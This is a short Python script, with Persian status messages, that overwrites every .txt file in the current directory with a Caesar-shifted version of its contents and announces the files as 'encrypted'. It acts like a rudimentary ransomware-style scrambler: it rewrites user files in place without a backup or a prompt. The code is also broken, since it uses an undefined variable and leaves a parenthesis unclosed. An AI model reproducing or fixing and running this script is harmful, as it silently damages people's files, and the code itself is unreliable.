import os
import subprocess
cwd =os.getcwd()

file_list = os.listdir(current_directory

for file_name in file_list:
    if file_name.endswith(".txt"): 
        file_path = os.path.join(current_directory, file_name)

        
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()

       
        encrypted_content = ""
        for char in content:
            encrypted_content += chr(ord(char) + 3)

        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(encrypted_content)

        
        subprocess.run(["echo", f"{file_name} رمزگذاری شد."])

subprocess.run(["echo", "تمام فایل‌های متنی رمزگذاری شدند."])
